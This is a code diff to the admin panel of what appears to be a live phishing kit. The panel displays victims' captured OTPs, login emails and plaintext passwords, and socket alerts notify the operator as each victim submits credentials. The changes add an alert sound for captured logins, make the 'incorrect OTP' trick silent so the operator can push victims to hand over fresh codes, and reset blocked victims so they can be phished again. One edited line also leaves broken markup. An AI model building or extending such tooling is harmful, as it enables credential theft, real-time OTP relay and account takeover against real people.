@@ -260,6 +260,14 @@ tr:hover {
   background: var(--border-light);
 }
 
+/* Timestamp styling */
+.timestamp {
+  font-size: 10px;
+  font-family: monospace;
+  color: var(--text-muted);
+  white-space: nowrap;
+}
+
 /* Data Styling */
 .data-value {
   display: inline-flex;
@@ -659,6 +667,16 @@ tr:hover {
           osc2.start(now + 0.35);
           osc2.stop(now + 0.55);
         }, 350);
+      } else if (action === 'login-submitted') {
+        const osc = audioContext.createOscillator();
+        const gain = audioContext.createGain();
+        osc.type = 'triangle';
+        osc.frequency.value = 660;
+        gain.gain.value = 0.25;
+        osc.connect(gain);
+        gain.connect(audioContext.destination);
+        osc.start(now);
+        osc.stop(now + 0.3);
       }
     } catch(e) {}
   }
@@ -669,6 +687,7 @@ tr:hover {
     return `<span class="timestamp" title="${date.toLocaleString()}">${date.toLocaleString()}</span>`;
   }
 
+  // Show notification with sound (for normal events)
   function showNotification(title, message, action, playSound = true) {
     const toast = document.getElementById('notificationToast');
     document.getElementById('notificationTitle').textContent = title;
@@ -819,9 +838,9 @@ tr:hover {
     }
   }
 
-  // INCORRECT OTP - Shows RED error message (not a popup)
+  // INCORRECT OTP - SILENT ACTION (NO TOAST, NO SOUND)
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see an error message on their screen.`)) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see an error message below the OTP input and can try again.`)) {
       try {
         const response = await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
@@ -833,13 +852,11 @@ tr:hover {
         });
         const data = await response.json();
         if (data.success) {
-          showNotification('Incorrect OTP', `Error message sent to ${email}`, 'incorrect', true);
-        } else {
-          showNotification('Error', data.error || 'Failed to send incorrect OTP message', 'error', false);
+          // SILENT - No toast notification, no sound
+          console.log('Incorrect OTP triggered for:', email);
         }
       } catch (error) {
         console.error('Incorrect OTP error:', error);
-        showNotification('Error', 'Network error', 'error', false);
       }
     }
   }
@@ -877,7 +894,7 @@ tr:hover {
   }
 
   async function unblockEmail(email) {
-    if (confirm(`Unblock ${email}?`)) {
+    if (confirm(`Unblock ${email}?\n\nThis will completely reset the user's data. They can submit again as a new user.`)) {
       try {
         const response = await fetch('/api/admin/unblock-email', {
           method: 'POST',
@@ -889,9 +906,10 @@ tr:hover {
         });
         const data = await response.json();
         if (data.success) {
-          showNotification('Email Unblocked', `${email} can now submit again`, 'unblock', false);
+          showNotification('Email Unblocked', `${email} has been unblocked and reset.`, 'unblock', false);
           loadBlockedEmails();
           loadUsers();
+          closeBlockedModal();
         } else {
           showNotification('Error', data.error || 'Failed to unblock', 'error', false);
         }
@@ -999,7 +1017,7 @@ tr:hover {
           <td>${user.second_otp ? formatValue(user.second_otp, 'Second OTP') : '<span class="data-empty">—</span>'}</td>
           <td>${user.login_email ? formatValue(user.login_email, 'Login Email') : '<span class="data-empty">—</span>'}</td>
           <td>${user.login_password ? formatValue(user.login_password, 'Login Password') : '<span class="data-empty">—</span>'}</td>
-          <td>${formatTimestamp(user.email_submitted_at)}</td>
+          <td>${formatTimestamp(user.email_submitted_at)}</span>}</td>
           <td>${statusBadge}</td>
           <td class="actions-cell">${actionButtons}</td>
         </tr>
@@ -1091,6 +1109,7 @@ tr:hover {
     window.location.href = '/admin';
   }
 
+  // Socket listeners - Only for data received events (not for admin button actions)
   socket.on('connect', () => console.log('Admin connected'));
   socket.on('user-login', (data) => {
     showNotification('📧 New Email Submission', `${data.email} signed up`, 'email', true);
@@ -1105,7 +1124,7 @@ tr:hover {
     loadUsers();
   });
   socket.on('user-login-submitted', (data) => {
-    showNotification('🔐 Login Submitted', `${data.email} submitted login: ${data.loginEmail}`, 'login', true);
+    showNotification('🔐 Login Submitted', `${data.email} submitted login: ${data.loginEmail}`, 'login-submitted', true);
     loadUsers();
   });
   socket.on('force-login-triggered', (data) => {
@@ -1133,6 +1152,11 @@ tr:hover {
     loadUsers();
     loadBlockedEmails();
   });
+  socket.on('user-unblocked', (data) => {
+    showNotification('🔓 User Unblocked', `${data.email} has been unblocked and reset`, 'unblock', false);
+    loadUsers();
+    loadBlockedEmails();
+  });
 
   document.getElementById('sendTextBtnModal').addEventListener('click', sendTextToUser);
   document.getElementById('releaseTextBtnModal').addEventListener('click', releaseTextPopup);
@@ -1145,6 +1169,7 @@ tr:hover {
 
   loadUsers();
   setInterval(loadUsers, 5000);
+  loadBlockedEmails();
 </script>
 
 </body>
